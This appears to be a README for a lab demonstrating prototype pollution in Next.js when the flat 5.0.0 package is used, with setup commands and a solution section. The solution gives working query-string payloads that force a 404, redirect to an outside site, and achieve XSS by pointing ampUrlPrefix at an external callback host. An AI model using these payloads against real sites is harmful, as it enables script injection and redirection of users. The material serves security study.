# Next.js-Flat-Prototype-Pollution

A prototype pollution scenario in [Next.js](https://github.com/vercel/next.js/) when [flat:5.0.0](https://www.npmjs.com/package/flat) is used.

> Video goes here

## Setup Instructions

Install dependencies and start production server.

```sh
npm install
npm run build
npm start
```

## Solution

<details><summary>Test - 404 page</summary><br/>

```url
/vulnerable?__proto__.notFound=1
```

</details>

<details><summary>Test - redirect to google</summary><br/>

```url
/vulnerable?__proto__.redirect.destination=https://google.com
```

</details>

<details><summary>XSS</summary><br/>
    
```url
/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co/
```

</details>
